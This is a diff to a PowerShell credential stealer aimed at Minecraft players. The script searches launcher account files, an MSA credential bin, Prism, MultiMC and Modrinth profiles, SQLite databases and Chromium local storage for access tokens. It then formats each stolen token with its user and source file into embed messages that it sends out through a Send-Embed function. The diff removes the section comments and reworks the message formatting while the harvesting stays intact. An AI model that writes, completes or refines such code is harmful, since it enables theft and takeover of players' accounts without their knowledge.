@@ -11,6 +11,8 @@ try{
 
 $found = @()
 $seen = @{}
+$nl = [char]10
+$bt3 = [char]96 + [char]96 + [char]96
 
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
@@ -37,7 +39,7 @@ function Scan-Text {
     foreach($m in $ms){
         $val = [string]$m.Value
         if([string]::IsNullOrEmpty($val)){ continue }
-        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }  # skip encrypted JWE wrappers
+        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
         Add-Token $val $user $src "accessToken"
     }
 }
@@ -93,7 +95,6 @@ function Scan-Db {
     }catch{}
 }
 
-# ---------- 1. known launcher json files ----------
 $paths = @(
     "$env:APPDATA\.minecraft\launcher_accounts.json",
     "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
@@ -127,7 +128,6 @@ $paths = @(
 )
 foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }
 
-# ---------- 2. decrypt msa bin ----------
 $bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
 if(Test-Path $bin){
     try{
@@ -138,7 +138,6 @@ if(Test-Path $bin){
     }catch{}
 }
 
-# ---------- 3. deep scan launcher roots ----------
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -169,7 +168,6 @@ foreach($r in $roots){
     }catch{}
 }
 
-# ---------- 4. modpack profile configs ----------
 $profileRoots = @(
     "$env:APPDATA\PrismLauncher\instances",
     "$env:APPDATA\MultiMC\instances",
@@ -187,7 +185,6 @@ foreach($pr in $profileRoots){
     }catch{}
 }
 
-# ---------- 4b. modrinth profile configs ----------
 $modrinthRoot = "$env:APPDATA\ModrinthApp"
 if(Test-Path $modrinthRoot){
     $profilesDir = "$modrinthRoot\profiles"
@@ -205,7 +202,6 @@ if(Test-Path $modrinthRoot){
     }
 }
 
-# ---------- 4c. sqlite db scans ----------
 $dbs = @(
     "$env:APPDATA\ModrinthApp\app.db",
     "$env:APPDATA\ModrinthApp\app.db-wal",
@@ -218,7 +214,6 @@ $dbs = @(
 )
 foreach($db in $dbs){ Scan-Db $db "db-scan" }
 
-# ---------- 5. chromium localstorage ----------
 $webcaches = @(
     "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
     "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
@@ -240,7 +235,6 @@ foreach($lc in $webcaches){
     }catch{}
 }
 
-# ---------- send embed ----------
 function Send-Embed {
     param($title, $desc, $color, $footerText)
     $embed = @{
@@ -273,9 +267,16 @@ if($found.Count -eq 0){
     $i = 0
     foreach($t in $found){
         $i++
-        $lines += "```ansi`n[ $i ] $($t.User)`nType: $($t.Type)`nToken: $($t.Token)`nFile: $($t.File)`n```"
+        $block = @()
+        $block += $bt3 + "ansi"
+        $block += "[ $i ] " + $t.User
+        $block += "Type: " + $t.Type
+        $block += "Token: " + $t.Token
+        $block += "File: " + $t.File
+        $block += $bt3
+        $lines += ($block -join $nl)
     }
-    $joined = $lines -join "`n"
+    $joined = $lines -join $nl
 }
 
 $limit = 1700
